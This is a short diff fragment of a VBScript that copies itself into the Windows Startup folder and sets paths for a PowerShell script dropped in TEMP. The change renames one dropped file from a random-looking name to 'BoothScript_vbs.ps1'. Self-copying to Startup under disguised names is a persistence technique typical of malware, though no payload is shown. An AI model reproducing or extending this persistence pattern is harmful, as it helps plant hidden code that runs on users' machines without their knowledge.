@@ -22,7 +22,7 @@ startupPath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\
 tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
 scriptPath = WScript.ScriptFullName
 destPath = startupPath & "\BootScript.vbs"
-notepadScriptPath = startupPath & "\wtc9AACOD031020.vbs"
+notepadScriptPath = startupPath & "\BoothScript_vbs.ps1"
 psScriptPath = tempFolder & "\wtc9AACOD031020.ps1"
 
 ' Copy this script to Startup
